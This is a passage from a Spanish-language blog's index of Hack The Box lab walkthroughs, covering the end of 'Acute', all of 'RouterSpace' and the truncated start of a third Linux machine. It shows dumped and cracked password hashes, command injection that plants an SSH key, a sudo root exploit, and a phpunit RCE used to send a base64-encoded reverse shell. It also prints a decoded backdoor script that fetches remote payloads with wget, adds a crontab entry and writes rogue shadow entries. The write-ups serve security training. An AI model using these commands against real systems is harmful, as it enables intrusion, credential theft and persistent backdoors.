Primary:Kerberos-Newer-Keys * Default Salt : MVL-SVR01.MARVEL.HTBAdministrator Default Iterations : 4096 Credentials aes256_hmac (4096) : c3cd5b6f980fdebc434e04eed27ef73b7e257fda197e008bc7ef1b3502a075a5 aes128_hmac (4096) : 83cb77df0959373fb1f7dbdda42ad684 des_cbc_md5 (4096) : 8f3249ef3dc1bff7 * Packages * NTLM-Strong-NTOWF * Primary:Kerberos * Default Salt : MVL-SVR01.MARVEL.HTBAdministrator Credentials des_cbc_md5 : 8f3249ef3dc1bff7 RID : 000001f5 (501) User : Guest RID : 000001f7 (503) User : DefaultAccount RID : 000001f8 (504) User : WDAGUtilityAccount Hash NTLM: 24571eab88ac0e2dcef127b8e9ad4740 Supplemental Credentials: * Primary:NTLM-Strong-NTOWF * Random Value : 014e3c3563b7599b4b2ffea6a1f5ce60 * Primary:Kerberos-Newer-Keys * Default Salt : WDAGUtilityAccount Default Iterations : 4096 Credentials aes256_hmac (4096) : 8f08a53f14bbb27f0283fd90323dcd4e21ccc7a119d60cbbafb6c461ded08710 aes128_hmac (4096) : 11e388be492e65daac6493f665631d3f des_cbc_md5 (4096) : 297ad0071abf5b6d * Packages * NTLM-Strong-NTOWF * Primary:Kerberos * Default Salt : WDAGUtilityAccount Credentials des_cbc_md5 : 297ad0071abf5b6d RID : 000003e9 (1001) User : Natasha Hash NTLM: 29ab86c5c4d2aab957763e5c1720486d lm - 0: f82f2bf1f89c2939790e40f751d5b190 ntlm- 0: 29ab86c5c4d2aab957763e5c1720486d ntlm- 1: de3638aef735f9b81ea181465871e71b Supplemental Credentials: * Primary:NTLM-Strong-NTOWF * Random Value : fdd887d7c6e85189b2cbc37ac772b429 * Primary:Kerberos-Newer-Keys * Default Salt : MVL-SVR01.MARVEL.HTBNatasha Default Iterations : 4096 Credentials aes256_hmac (4096) : 85ef7e3d1d28efc32cec29b4d2e201fc0eb55b05c5e3249f951aba713fe8fe67 aes128_hmac (4096) : 70893ba6dd932940051a0714a3a7b184 des_cbc_md5 (4096) : 978a07d05ba770f7 OldCredentials aes256_hmac (4096) : 6d8e87f273e0260d402c65f1b6c3da5604dacf6d25a543a65827acdf927fd924 aes128_hmac (4096) : dedc1d09097b091f2e430a2c8d768107 des_cbc_md5 (4096) : 1089e6eca449c731 OlderCredentials aes256_hmac (4096) : 6d8e87f273e0260d402c65f1b6c3da5604dacf6d25a543a65827acdf927fd924 aes128_hmac (4096) : dedc1d09097b091f2e430a2c8d768107 des_cbc_md5 (4096) : 1089e6eca449c731 * Packages * NTLM-Strong-NTOWF * Primary:Kerberos * Default Salt : MVL-SVR01.MARVEL.HTBNatasha Credentials des_cbc_md5 : 978a07d05ba770f7 OldCredentials des_cbc_md5 : 1089e6eca449c731  De la salida anterior, conseguimos los siguientes hashes NTLM:\n Administrator:a29f7623fd11550def0192de9246f46b Natasha:29ab86c5c4d2aab957763e5c1720486d WDAGUtilityAccount:24571eab88ac0e2dcef127b8e9ad4740  En lugar de utilizar Pass the Hash, los trataremos de romper con john:\n$ echo 'Administrator:a29f7623fd11550def0192de9246f46b' \u0026gt;\u0026gt; hashes $ echo 'Natasha:29ab86c5c4d2aab957763e5c1720486d' \u0026gt;\u0026gt; hashes $ echo 'WDAGUtilityAccount:24571eab88ac0e2dcef127b8e9ad4740' \u0026gt;\u0026gt; hashes $ john --wordlist=$WORDLISTS/rockyou.txt --format=NT hashes Using default input encoding: UTF-8 Loaded 3 password hashes with no different salts (NT [MD4 128/128 ASIMD 4x2]) Press 'q' or Ctrl-C to abort, almost any other key for status Password@123 (Administrator) 1g 0:00:00:00 DONE 1.098g/s 15762Kp/s 15762Kc/s 32676KC/s \"amo-te\"..*7¡Vamos! Use the \"--show --format=NT\" options to display all of the cracked passwords reliably Session completed.  Movimiento lateral al usuario awallace Ahora podemos acceder como awallace utilizando el mismo procedimiento que antes:\nPS C:\\Utils\u0026gt; $pass = ConvertTo-SecureString \"Password@123\" -AsPlaintext -Force PS C:\\Utils\u0026gt; $cred = New-Object System.Management.Automation.PSCredential (\"acute\\awallace\", $pass) PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami } acute\\imonks PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami } acute\\awallace  Este usuario es capaz de listar la carpeta C:\\Program Files\\keepmeon, donde encontramos un script Batch:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ls \"C:\\Program Files\\keepmeon\" } Directory: C:\\Program Files\\keepmeon Mode LastWriteTime Length Name PSComputerName ---- ------------- ------ ---- -------------- -a---- 21/12/2021 14:57 128 keepmeon.bat atsserver PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { type \"C:\\Program Files\\keepmeon\\keepmeon.bat\" }  REM This is run every 5 minutes. For Lois use ONLY @echo off for /R %%x in (*.bat) do ( if not \"%%x\" == \"%~0\" call \"%%x\" )  El script se ejecuta cada 5 minutos y básicamente ejecuta cualquier script Batch que hay en la carpeta actual.\nEscalada de privilegios Aquí tenemos que recordar que Lois (lhopkins) es capaz de asignar los miembros de los grupos (mostrado en el documento de Word). Por tanto, podemos utilizar un comando para añadir a awallace al grupo Site_Admin:\nPS C:\\Utils\u0026gt; Invoke-Command -ConfigurationName dc_manage -Credential $cred -ScriptBlock { Set-Content -Path net user lhopkins } User name lhopkins Full Name Lois Hopkins Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 21/12/2021 14:51:53 Password expires Never Password changeable 22/12/2021 14:51:53 Password required Yes User may change password No Workstations allowed All Logon script User profile Home directory Last logon 27/02/2022 01:31:45 Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users The command completed successfully. PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { Set-Content -Path \"C:\\Program Files\\keepmeon\\a.bat\" -Value net group site_admin } Group name Site_Admin Comment Only in the event of emergencies is this to be populated. This has access to Domain Admin group Members ------------------------------------------------------------------------------- The command completed successfully. PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { Set-Content -Path \"C:\\Program Files\\keepmeon\\a.bat\" -Value \"net group site_admin awallace /add /domain\" } PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { type \"C:\\Program Files\\keepmeon\\a.bat\" } net group site_admin awallace /add /domain  Después de algunos minutos, veremos que pertenecemos al grupo Domain Admins, y por tanto, podremos leer la flag root.txt:\nPS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami /groups } GROUP INFORMATION ----------------- Group Name Type SID Attributes ============================================ ================ ============================================== =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTIN\\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group ACUTE\\Domain Admins Group S-1-5-21-1786406921-1914792807-2072761762-512 Mandatory group, Enabled by default, Enabled group ACUTE\\Managers Group S-1-5-21-1786406921-1914792807-2072761762-1111 Mandatory group, Enabled by default, Enabled group ACUTE\\Site_Admin Group S-1-5-21-1786406921-1914792807-2072761762-2102 Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group ACUTE\\Denied RODC Password Replication Group Alias S-1-5-21-1786406921-1914792807-2072761762-572 Mandatory group, Enabled by default, Enabled group, Local Group Mandatory Label\\High Mandatory Level Label S-1-16-12288 PS C:\\Utils\u0026gt; Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { type C:\\Users\\Administrator\\Desktop\\root.txt } 4964aad06240586b6e55bf408011c24e  ","image":"/images/HTB/Acute/Acute.png","permalink":"https://7rocky.github.io/htb/acute/","section":"htb","summary":"Hack The Box. Windows. Máquina difícil. Esta máquina expone una página web donde se puede encontrar un documento de Word con información sensible y nombres de usuarios. Existe un acceso web a PowerShell en el cual podemos acceder utilizando una credencial débil y extraer otra contraseña a partir de una captura de pantalla. Existe un controlador de dominio de un entorno de Active Directory donde podemos ejecutar comandos como otros usuarios. Podremos conectarnos a la primera máquina y extraer hashes NTLM y finalmente convertirnos en administrador del dominio. Para comprometer esta máquina se necesitan conocimientos de PowerShell y técnicas básicas de explotación de Windows y Active Directory","time":15,"title":"Acute"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.11.148   Fecha: 26 / 02 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.148 -p 22,80 Nmap scan report for 10.10.11.148 Host is up (0.040s latency). PORT STATE SERVICE VERSION 22/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-RouterSpace Packet Filtering V1 | ssh-hostkey: | 3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA) | 256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA) |_ 256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519) 80/tcp open http | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-51297 | Content-Type: text/html; charset=utf-8 | Content-Length: 71 | ETag: W/\"47-iID6daXtR7fCN27hcgS/4V1AKSA\" | Date: | Connection: close | Suspicious activity detected !!! {RequestID: C Z Rf pM 6 anm uqeC } | GetRequest: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-90258 | Accept-Ranges: bytes | Cache-Control: public, max-age=0 | Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT | ETag: W/\"652c-17d476c9285\" | Content-Type: text/html; charset=UTF-8 | Content-Length: 25900 | Date: | Connection: close | \u0026lt;!doctype html\u0026gt; | \u0026lt;html class=\"no-js\" lang=\"zxx\"\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\"utf-8\"\u0026gt; | \u0026lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"\u0026gt; | \u0026lt;title\u0026gt;RouterSpace\u0026lt;/title\u0026gt; | \u0026lt;meta name=\"description\" content=\"\"\u0026gt; | \u0026lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\"css/bootstrap.min.css\"\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\"css/owl.carousel.min.css\"\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\"css/magnific-popup.css\"\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\"css/font-awesome.min.css\"\u0026gt; | \u0026lt;link rel=\"stylesheet\" href=\"css/themify-icons.css\"\u0026gt; | HTTPOptions: | HTTP/1.1 200 OK | X-Powered-By: RouterSpace | X-Cdn: RouterSpace-62870 | Allow: GET,HEAD,POST | Content-Type: text/html; charset=utf-8 | Content-Length: 13 | ETag: W/\"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo\" | Date: | Connection: close | GET,HEAD,POST | RTSPRequest, X11Probe: | HTTP/1.1 400 Bad Request |_ Connection: close |_http-title: RouterSpace |_http-trane-info: Problem with XML parsing of /evox/about Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 16.17 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nAnalizando un archivo APK Si vamos a http://10.10.11.148, veremos una página web como esta:\nAquí podemos descargar un archivo APK que contiene una aplicación móvil Android para conectarse a un router.\n$ grep -ia routerspace RouterSpace.apk (R, R) Remove %1$sReport RouterSpaceSave routerspace.htb10U routerspace10U routerspace.htb10U routerspace10U  Esto nos muestra que routerspace.htb es un dominio que tenemos que introducir en /etc/hosts.\nEn este punto, podríamos usar MobSF para analizar el archivo APK, ya que permite realizar análisis estáticos y dinámicos (con Genymotion). Una vez que está todo configurado, podemos iniciar MobSF:\nAhora, subimod el archivo APK y comenzamos el análisis:\nUn análisis de código estático de los archivos Java no será útil, ya que la APK se generó con React Native. Por tanto, vamos a iniciar un análisis dinámico:\nMobSF es tan bueno que permite ver la pantalla de la app desde el navegador:\nSi pinchamos en \u0026ldquo;Check Status\u0026rdquo;, veremos un error:\nInspeccionando tráfico HTTP En este punto, intenté configurar un proxy HTTP en MobSF, pero fue más sencillo con anbox y Burp Suite. Estos son los comandos necesarios:\n$ anbox launch --package=org.anbox.appmgr --component=org.anbox.appmgr.AppViewActivity Activity  $ adb kill-server $ adb start-server * daemon not running; starting now at tcp:5037 * daemon started successfully $ adb devices List of devices attached emulator-5558 device $ adb connect 127.0.0.1:5037 connected to 127.0.0.1:5037 $ adb install RouterSpace.apk Success  $ ifconfig anbox0 anbox0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.250.1 netmask 255.255.255.0 broadcast 0.0.0.0 inet6 fe80::8f7:50ff:fe42:beb3 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether fe:f0:c2:f7:31:3b txqueuelen 1000 (Ethernet) RX packets 28 bytes 2420 (2.4 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 79 bytes 15733 (15.7 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0  $ adb shell settings put global http_proxy 192.168.250.1:8080  Ahora, si pinchamos en \u0026ldquo;Check Status\u0026rdquo;, veremos la petición web en Burp Suite:\nY esta es la respuesta:\nPodemos replicar la misma petición con curl:\n$ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -d '{\"ip\":\"0.0.0.0\"}' Suspicious activity detected !!! {RequestID: 0 O3XJ g K MJ E I Jw }  Pero necesitamos poner User-Agent: RouterSpaceAgent para imitar a la APK, de manera que no nos pillan:\n$ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"0.0.0.0\"}' \"0.0.0.0\\n\"  Explotando una inyección de comandos Nótese que la respuesta devuelve el mismo valor que hay en ip:\n$ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"0.0.0.0x\"}' \"0.0.0.0x\\n\" $ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"asdf\"}' \"asdf\\n\"  Vamos a tratar de inyectar un comando de sistema:\n$ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"`whoami`\"}' \"paul\\n\"  Y es vulnerable a inyección de comandos. Vamos a leer la flag user.txt:\n$ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"`cat /home/paul/user.txt`\"}' \"3186ef30c6d390192314aa7bf355068c\\n\"  Acceso a la máquina Si tratamos de obtener una reverse shell, no podremos debido a algunas reglas iptables. Sin embargo, podemos introducir una clave pública de SSH en /home/paul/.ssh/authorized_keys y conectarnos por SSH como paul:\n$ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"`ls -la --time-style=+ /home/paul/.ssh/`\"}' \"total 8 drwx------ 2 paul paul 4096 . drwxr-xr-x 8 paul paul 4096 ..\\n\"  $ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (~/.ssh/id_rsa): id_rsa Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in id_rsa Your public key has been saved in id_rsa.pub The key fingerprint is: SHA256:tWK5MX2wtzjqjNUfjWNK0dvzcluD/UwRbr618J8mUQg The key's randomart image is: +---[RSA 3072]----+ | | | E | | o . .. | | + = ....| | S = + .+ | | . * = B= .| | o = Bo=++| | + o = ++*X| | ..+ . . oOB| +----[SHA256]-----+ $ cat id_rsa.pub ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDvVJzNh61shoVPa4wfxz/GjAc5CJ2+IznWzjixGWOpbScP3ZOmGfiJ711e0WoGtEnTRVwZzDiz6dmXElC/vSNz0JyQ4BXGOor3XMXcoF+jBmBAmVdzuyKJJPtqu11BO9QvzS6lR5U0iMQR6CFE1tkHiMsnRr55aljUqnnLyO0ANfsTEOu1fkHDO+4GFwESUYrbLX+dbdff2MOGmx6ZqATM2D8D/I4LJ8KvPraeRA3b9BxX3ymduhGwrcDFhcA2f77814ZZUUpFZyVIVA9DOHZHm2ZOVY15QXA9SMLM7K8HkHhLNljEjc13zDfWGWD9nO4QKVe+RUuLgq9K6Y183e14JVU55R0y4LnkR7pSHc5P02PYkJKB3oVESwNjxShOmTdnAFIRCm8dVCSODaAMR/jwdCAYBNlZKwiT7BROQpU3IntUUW87nQKyzTOXaMbgYgVq8X43G5fItL5eT83WcSITsVTHD1MX69x3+bgSLKEf9xSfY$DLc2OYJb9pK7AVcLk= $ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"`echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDvVJzNh61shoVPa4wfxz/GjAc5CJ2+IznWzjixGWOpbScP3ZOmGfiJ711e0WoGtEnTRVwZzDiz6dmXElC/vSNz0JyQ4BXGOor3XMXcoF+jBmBAmVdzuyKJJPtqu11BO9QvzS6lR5U0iMQR6CFE1tkHiMsnRr55aljUqnnLyO0ANfsTEOu1fkHDO+4GFwESUYrbLX+dbdff2MOGmx6ZqATM2D8D/I4LJ8KvPraeRA3b9BxX3ymduhGwrcDFhcA2f77814ZZUUpFZyVIVA9DOHZHm2ZOVY15QXA9SMLM7K8HkHhLNljEjc13zDfWGWD9nO4QKVe+RUuLgq9K6Y183e14JVU55R0y4LnkR7pSHc5P02PYkJKB3oVESwNjxShOmTdnAFIRCm8dVCSODaAMR/jwdCAYBNlZKwiT7BROQpU3IntUUW87nQKyzTOXaMbgYgVq8X43G5fItL5eT83WcSITsVTHD1MX69x3+bgSLKEf9xSfYnDLc2OYJb9pK7AVcLk= \u0026gt;\u0026gt; /home/paul/.ssh/authorized_keys`\"}' \"\\n\" $ curl routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'Content-Type: application/json' -H 'User-Agent: RouterSpaceAgent' -d '{\"ip\":\"`ls -la /home/paul/.ssh/`\"}' \"total 12 drwx------ 2 paul paul 4096 . drwxr-xr-x 8 paul paul 4096 .. -rw-r--r-- 1 paul paul 553 authorized_keys\\n\"  Genial, ahora tenemos acceso como paul:\n$ ssh -i id_rsa paul@10.10.11.148 paul@routerspace:~$  Escalada de privilegios con sudo Si ejecutamos linpeas.sh, veremos que la versión de sudo es vulnerable:\n$ scp -i id_rsa linpeas.sh paul@10.10.11.148:/tmp linpeas.sh 100% 746KB 713.4KB/s 00:01  paul@routerspace:~$ cd /tmp paul@routerspace:/tmp$ bash linpeas.sh ... ╔══════════╣ Sudo version ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version Sudo version 1.8.31 ...  Ciertamente, sudo version 1.8.31 es vulnerable al CVE-2021-3156:\npaul@routerspace:~$ sudo -V Sudo version 1.8.31 Sudoers policy plugin version 1.8.31 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.31  Para explotarlo, compilaré este exploit: Sudo-1.8.31-Root-Exploit. Afortunadamente, tenemos gcc instalado en la máquina:\npaul@routerspace:~$ which gcc /usr/bin/gcc  Entonces, vamos a comprimir los archivos y transferirlos a la máquina:\n$ tar -czf exploit.tar.gz exploit.c Makefile shellcode.c $ scp -i id_rsa exploit.tar.gz paul@10.10.11.148:/tmp exploit.tar.gz 100% 1324 14.5KB/s 00:00  Ahora, descomprimimos el archivo, compilamos el exploit y lo ejecutamos para conseguir una shell como root:\npaul@routerspace:/tmp$ tar xvfz exploit.tar.gz exploit.c Makefile shellcode.c paul@routerspace:/tmp$ make mkdir libnss_x cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c cc -O3 -o exploit exploit.c paul@routerspace:/tmp$ ./exploit # cat /root/root.txt b8c6654274a29e9cc18cb6297d1c166e  ","image":"/images/HTB/RouterSpace/RouterSpace.png","permalink":"https://7rocky.github.io/htb/routerspace/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina tiene un archivo APK con una app sencilla. Esta app realiza una petición web a una API que tiene que ser capturada con un proxy, y esta API es vulnerable a inyección de comandos. Después, el acceso a la máquina se puede realizar por SSH y una enumeración básica muestra que la versión de sudo es vulnerable","time":5,"title":"RouterSpace"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.146   Fecha: 19 / 02 / 2022   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.146 -p 22,80 Nmap scan report for 10.10.11.146 Host is up (0.034s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2 (protocol 2.0) | ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA) | 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA) |_ 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Diana's Jewelry Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 15.22 seconds  La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).\nEnumeración web Si vamos a http://10.10.11.146 veremos una página web como esta:\nSi pinchamos en \u0026ldquo;VISIT STORE\u0026rdquo;, se nos redirige a http://store.djewelry.htb. Después de poner el subdominio en /etc/hosts veremos la siguiente página:\nPero nada interesante. Vamos a aplicar fuzzing para enumerar más rutas:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://store.djewelry.htb/FUZZ images [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 93ms] css [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 129ms] js [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 225ms] vendor [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 126ms] fonts [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 108ms] [Status: 200, Size: 6215, Words: 528, Lines: 196, Duration: 184ms] server-status [Status: 403, Size: 283, Words: 20, Lines: 10, Duration: 94ms]  Existe una ruta /vendor:\nEste directorio muestra las dependencias del proyecto web. Existe una vulnerabilidad para phpunit que deriva en ejecución remota de comandos (RCE). Su explotación se muestra en blog.ovhcloud.com (CVE-2017-9841), y se puede realizar simplemente con curl:\n$ curl -d '\u0026lt;?php system(\"whoami\");' store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php www-data  Intrusión en la máquina Perfecto, vamos a obtener una reverse shell en la máquina con un comando en Bash codificado en Base64:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  $ curl -d '\u0026lt;?php system(\"echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\");' store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.146. Ncat: Connection from 10.10.11.146:46572. bash: cannot set terminal process group (934): Inappropriate ioctl for device bash: no job control in this shell www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ cd / cd / www-data@production:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@production:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@production:/$ export TERM=xterm www-data@production:/$ export SHELL=bash www-data@production:/$ stty rows 50 columns 158  Enumeración del sistema Lo primero que notamos es que hay otro usuario llamado steven:\nwww-data@production:/$ ls /home steven  Lo que es extraño es que hay un usuario llamado steven1 en /etc/passwd, y con el mismo ID de usuario (1000):\nwww-data@production:/$ grep sh$ /etc/passwd root:x:0:0:root:/root:/bin/bash steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash steven1:x:1000:1000:,,,:/home/steven:/bin/bash  Esto es muy raro, ¿no? Vamos a mirar a qué archivos podemos acceder como www-data:\nwww-data@production:/$ find / -user www-data -type f 2\u0026gt;/dev/null | grep -vE 'proc|www' /var/backups/info  Tenemos /var/backups/info:\nwww-data@production:/$ ls -l /var/backups/info -r-x------ 1 www-data www-data 27296 May 14 2021 /var/backups/info  Podemos leer y ejecutar el archivo. Se trata de un binario ELF de 64 bits:\nwww-data@production:/$ file /var/backups/info /var/backups/info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped  Si ejecutamos el binario, vemos que es un exploit de kernel, pero parece que no funciona:\nwww-data@production:/$ /var/backups/info [.] starting [.] namespace sandbox set up [.] KASLR bypass enabled, getting kernel addr [-] substring 'ffff' not found in dmesg  Podemos empezar a pensar que la máquina ha sido comprometida anteriormente.\nComo strings no está instalado en la máquina, vamos a transferir el binario a nuestra máquina usando nc:\nwww-data@production:/$ nc 10.10.14.62 4444 \u0026lt; /var/backups/info ^C www-data@production:/$ md5sum /var/backups/info 04060ea986c7bacdc64130a1d7b8ca2d /var/backups/info  $ nc -nlvp 4444 \u0026gt; info Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.146. Ncat: Connection from 10.10.11.146:40972. $ md5sum info 04060ea986c7bacdc64130a1d7b8ca2d info  Una vez que hemos comprobado la integridad del archivo, podemos ejecutar strings y ver una cadena de texto larga:\n$ strings -100 info 776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b  Parece que está codificada en hexadecimal (solo hay números y letras de la a a la f). Vamos a decodificar con xxd:\n$ strings -100 info | xxd -r -p wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo \"* 3 * * * root /var/lib/.main\" \u0026gt;\u0026gt; /etc/crontab; awk -F\":\" '$7 == \"/bin/bash\" \u0026\u0026 $3 \u0026gt;= 1000 {system(\"echo \"$1\"1:\\$6\\$zS7ykHfFMg3aYht4\\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: \u0026gt;\u0026gt; /etc/shadow\")}' /etc/passwd; awk -F\":\" '$7 == \"/bin/bash\" \u0026\u0026 $3 \u0026gt;= 1000 {system(\"echo \"$1\" \"$3\" \"$6\" \"$7\" \u0026gt; users.txt\")}' /etc/passwd; while read -r user group home shell _; do echo \"$user\"1\":x:$group:$group:,,,:$home:$shell\" 